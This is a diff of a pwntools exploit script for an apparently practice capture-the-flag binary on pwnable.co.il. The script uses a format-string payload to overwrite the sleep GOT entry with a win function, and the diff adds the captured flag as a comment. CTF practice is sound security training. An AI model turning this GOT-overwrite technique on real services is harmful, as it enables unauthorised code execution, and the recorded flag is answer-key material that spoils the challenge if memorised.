@@ -1,34 +1,28 @@
 from pwn import *
 
-# Addresses
-win = 0x0000000000401316
+#defines
+WIN = 0x0000000000401316
+SLEEP_GOT = 0x404068
 
+def main():
+    ### context ###
+    binary = ELF('./theater')
+    context.binary = binary
 
-# Load the binary
-binary = ELF('./theater')
-context.binary = binary
+    ### run ###
+    #p = process('./theater')
+    p = remote("pwnable.co.il", 9011) 
 
-# Start the process
-p = remote("pwnable.co.il", 9011) #process('./theater')
+    ### payload start ###
+    first_target_address = SLEEP_GOT
+    fmt_offset = 6
+    payload = fmtstr_payload(fmt_offset, {
+        first_target_address: WIN,   
+    })
+    p.sendline(payload)
+    p.interactive()
 
-# Target addresses to overwrite
-first_target_address = 0x000000404038#elf.got['printf']#0x00007fffffffd918
+if __name__ == "__main__":
+    main() 
 
-# Offset to the first format specifier
-fmt_offset = 6
-
-# Prepare the payload for the format string attack
-# First, we prepare the payload to overwrite both addresses
-payload = fmtstr_payload(fmt_offset, {
-    first_target_address: win,    # Overwrite first address with ret
-})
-
-# Write the payload to a file
-with open('payload', 'wb') as f:
-    f.write(payload)
-
-# Send the payload
-p.sendline(payload)
-
-# Interact with the process
-p.interactive()
+#flag: PWNIL{GOT_overwrites_are_a_problem_we_need_to_take_more_seriously}
